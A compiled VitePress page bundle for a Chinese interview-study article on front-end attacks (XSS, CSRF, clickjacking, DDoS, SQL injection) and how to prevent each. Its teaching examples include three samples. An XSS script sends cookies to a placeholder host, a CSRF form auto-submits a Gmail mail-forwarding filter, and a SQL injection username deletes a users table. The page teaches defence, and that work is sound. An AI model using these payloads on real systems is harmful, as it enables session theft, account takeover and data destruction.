import{_ as s,c as a,o as l,a as n}from"./app.ad3b77f8.js";const o="/mydocs/点击劫持.png",A=JSON.parse('{"title":"前端攻击手段有哪些，该如何预防","description":"","frontmatter":{},"headers":[{"level":2,"title":"XSS","slug":"xss","link":"#xss","children":[]},{"level":2,"title":"CSRF","slug":"csrf","link":"#csrf","children":[{"level":3,"title":"CSRF 的过程","slug":"csrf-的过程","link":"#csrf-的过程","children":[]},{"level":3,"title":"CSRF 的预防","slug":"csrf-的预防","link":"#csrf-的预防","children":[]}]},{"level":2,"title":"点击劫持 Clickjacking","slug":"点击劫持-clickjacking","link":"#点击劫持-clickjacking","children":[{"level":3,"title":"点击劫持的原理","slug":"点击劫持的原理","link":"#点击劫持的原理","children":[]},{"level":3,"title":"使用 JS 预防","slug":"使用-js-预防","link":"#使用-js-预防","children":[]}]},{"level":2,"title":"DDoS","slug":"ddos","link":"#ddos","children":[]},{"level":2,"title":"SQL 注入","slug":"sql-注入","link":"#sql-注入","children":[]}],"relativePath":"interview/知识广度-从前端到全栈/07-前端攻击手段有哪些，该如何预防.md"}'),p={name:"interview/知识广度-从前端到全栈/07-前端攻击手段有哪些，该如何预防.md"},e=n(`<h1 id="前端攻击手段有哪些-该如何预防" tabindex="-1">前端攻击手段有哪些，该如何预防 <a class="header-anchor" href="#前端攻击手段有哪些-该如何预防" aria-hidden="true">#</a></h1><ul><li>XSS</li><li>CSRF</li><li>点击劫持</li><li>DDoS</li><li>SQL 注入</li></ul><h2 id="xss" tabindex="-1">XSS <a class="header-anchor" href="#xss" aria-hidden="true">#</a></h2><ul><li><code>XSS</code>又称<code>Cross Site Scripting</code>---跨站脚本攻击</li><li>手段:黑客将JS 代码插入到网页内容中，染时执行JS代码</li><li>预防:特殊字符替换(前端或者后端)</li></ul><p>用户通过某种方式（如输入框、文本编辑器）输入一些内容，其中带有攻击代码（JS 代码）。<br> 该内容再显示时，这些代码也将会被执行，形成了攻击效果。</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki material-palenight"><code><span class="line"><span style="color:#676E95;font-style:italic;">&lt;!-- 例如用户提交的内容中有： --&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">script</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">var</span><span style="color:#A6ACCD;"> img </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> document</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">createElement</span><span style="color:#A6ACCD;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">img</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    img</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">src </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">http://xxx.com/api/xxx?userInfo=</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">+</span><span style="color:#A6ACCD;"> document</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">cookie </span><span style="color:#676E95;font-style:italic;">// 将 cookie 提交到自己的服务器</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">script</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"></span></code></pre></div><p>最简单的解决方式：替换特殊字符</p><div class="language-js"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki material-palenight"><code><span class="line"><span style="color:#C792EA;">const</span><span style="color:#A6ACCD;"> newStr </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> str</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">replaceAll</span><span style="color:#A6ACCD;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&lt;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&amp;lt;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">)</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">replaceAll</span><span style="color:#A6ACCD;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&gt;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&amp;gt;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">)</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;">//例如:</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;">//将&lt;script&gt;&lt;/script&gt;替换成&amp;lt; script &amp;gt;  &amp;lt; / script &amp;gt;</span></span>
<span class="line"></span></code></pre></div><p>也可以使用第三方工具，例如</p><ul><li><a href="https://www.npmjs.com/package/xss" target="_blank" rel="noreferrer">https://www.npmjs.com/package/xss</a></li><li><a href="https://www.npmjs.com/package/escape-html" target="_blank" rel="noreferrer">https://www.npmjs.com/package/escape-html</a></li></ul><p>现代框架默认会屏蔽 XSS 攻击，除非自己手动开启</p><ul><li>Vue <code>v-html</code></li><li>React <code>dangerouslySetInnerHTML</code></li></ul><h2 id="csrf" tabindex="-1">CSRF <a class="header-anchor" href="#csrf" aria-hidden="true">#</a></h2><ul><li>Cross-site request forgery 跨站请求伪造</li><li>手段:黑客诱导用户去访问另一个网站的接口，伪造请求</li><li>预防:严格的跨域限制 + 验证码机制</li></ul><p>请看下面的故事</p><ul><li>小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”</li><li>小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了</li></ul><p>但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 <code>hacker@hackermail.com</code> 。<br> 因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki material-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">form</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">method</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">POST</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">action</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">enctype</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">multipart/form-data</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">input</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">type</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">hidden</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">cf2_emc</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">value</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">true</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">/&gt;</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">input</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">type</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">hidden</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">cf2_email</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">value</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">hacker@hakermail.com</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">/&gt;</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#A6ACCD;">    .....</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">input</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">type</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">hidden</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">irf</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">value</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">on</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">/&gt;</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">input</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">type</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">hidden</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">nvp_bu_cftb</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">value</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">Create Filter</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">/&gt;</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">form</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">script</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#A6ACCD;">    document</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">forms[</span><span style="color:#F78C6C;">0</span><span style="color:#A6ACCD;">]</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">submit</span><span style="color:#A6ACCD;">()</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;">// PS：有些是 post 请求，有些是 get 请求</span></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;">//     get 请求如果用 img.src 还可以规避跨域，更加危险</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;/&gt;</span></span>
<span class="line"></span></code></pre></div><p>邮件经常用来接收验证码，这是很危险的事情。<br> 当然了，后来 Gmail 修复了这个漏洞。但新的故事仍在不断发生中。</p><h3 id="csrf-的过程" tabindex="-1">CSRF 的过程 <a class="header-anchor" href="#csrf-的过程" aria-hidden="true">#</a></h3><ul><li>用户登录了 <code>a.com</code> ，有了 cookie</li><li>黑客引诱用户访问 <code>b.com</code> 网页，并在其中发起一个跨站请求 <code>a.com/api/xxx</code></li><li><code>a.com</code> API 收到 cookie ，误以为是真实用户的请求，就受理了</li></ul><h3 id="csrf-的预防" tabindex="-1">CSRF 的预防 <a class="header-anchor" href="#csrf-的预防" aria-hidden="true">#</a></h3><ul><li>严格的跨域请求限制，如判断 referrer ( 请求来源)</li><li>为 cookie 设置 <code>SameSite</code> 不随跨域请求被发送 <code>Set-Cookie: key1=val1; key2=val2; SameSite=Strict;</code></li><li>关键接口使用短信验证码等双重验证</li></ul><h2 id="点击劫持-clickjacking" tabindex="-1">点击劫持 Clickjacking <a class="header-anchor" href="#点击劫持-clickjacking" aria-hidden="true">#</a></h2><ul><li><code>Click Jacking</code></li><li>手段:诱导界面上蒙一个透明的 <code>iframe</code>，诱导用户点击</li><li>预防:让<code>iframe</code>不能跨域加载</li></ul><p>小明被诱导到一个钓鱼网站，点击了一个按钮，其实已经关注了UP主。因为他可能已经登录了关注网站。<br> 这可以是关注，也可以是付款转账等其他危险操作。</p><p><img src="`+o+`" alt="" data-fancybox="gallery"></p><h3 id="点击劫持的原理" tabindex="-1">点击劫持的原理 <a class="header-anchor" href="#点击劫持的原理" aria-hidden="true">#</a></h3><p>黑客在自己的网站，使用隐藏的 <code>&lt;iframe&gt;</code> 嵌入其他网页，诱导用户按顺序点击。</p><h3 id="使用-js-预防" tabindex="-1">使用 JS 预防 <a class="header-anchor" href="#使用-js-预防" aria-hidden="true">#</a></h3><div class="language-js"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki material-palenight"><code><span class="line"><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> (top</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">location</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">hostname </span><span style="color:#89DDFF;">!==</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">location</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">hostname) </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#F07178;">    </span><span style="color:#82AAFF;">alert</span><span style="color:#F07178;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">您正在访问不安全的页面，即将跳转到安全页面！</span><span style="color:#89DDFF;">&quot;</span><span style="color:#F07178;">)</span></span>
<span class="line"><span style="color:#F07178;">    </span><span style="color:#A6ACCD;">top</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">location</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">href</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">=</span><span style="color:#F07178;"> </span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">location</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">href</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"></span></code></pre></div><p>增加 http header <code>X-Frame-Options:SAMEORIGIN</code> ，让 <code>&lt;iframe&gt;</code> 只能加载同域名的网页。</p><p>PS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。</p><h2 id="ddos" tabindex="-1">DDoS <a class="header-anchor" href="#ddos" aria-hidden="true">#</a></h2><ul><li>Distributed denial-of-service 分布式拒绝服务</li><li>手段:分布式的、大规模的流量访问，使服务器瘫痪</li><li>预防:软件层不好做，需硬件预防(如阿里云WAF)</li></ul><p>通过大规模的网络流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。<br> 类似于恶意堵车，妨碍正常车辆通行。</p><p>网络上的设备感染了恶意软件，被黑客操控，同时向一个域名或者 IP 发送网络请求。因此形成了洪水一样的攻击效果。<br> 由于这些请求都来自分布在网络上的各个设备，所以不太容易分辨合法性。</p><p>DDoS 的预防：软件层面不好做，可以选择商用的防火墙，如<a href="https://www.aliyun.com/product/waf?spm=5176.7967425.J_8058803260.34.3d017748VkTlhL" target="_blank" rel="noreferrer">阿里云 WAF</a>。</p><p>PS：阮一峰的网站就曾遭遇过 DDoS 攻击 <a href="https://www.ruanyifeng.com/blog/2018/06/ddos.html" target="_blank" rel="noreferrer">https://www.ruanyifeng.com/blog/2018/06/ddos.html</a></p><h2 id="sql-注入" tabindex="-1">SQL 注入 <a class="header-anchor" href="#sql-注入" aria-hidden="true">#</a></h2><ul><li>手段:黑客提交内容时写入 SQL 语，破坏数据库</li><li>预防:处理输入的内容，替换特殊字符</li></ul><p>普通的登录方式，输入用户名 <code>zhangsan</code> 、密码 <code>123</code> ，然后服务端去数据库查询。<br> 会执行一个 sql 语句 <code>select * from users where username=&#39;zhangsan&#39; and password=&#39;123&#39;</code> ，然后判断是否找到该用户。</p><p>如果用户输入的是用户名 <code>&#39; delete from users where 1=1; --</code> ，密码 <code>&#39;123&#39;</code><br> 那生成的 sql 语句就是 <code>select * from users where username=&#39;&#39; delete from users where 1=1; --&#39; and password=&#39;123&#39;</code><br> 这样就会把 <code>users</code> 数据表全部删除。</p><p><strong>防止 SQL 注入</strong>：服务端进行特殊字符转换，如把 <code>&#39;</code> 转换为 <code>\\&#39;</code></p>`,44),t=[e];function c(r,D,i,F,y,d){return l(),a("div",null,t)}const h=s(p,[["render",c]]);export{A as __pageData,h as default};
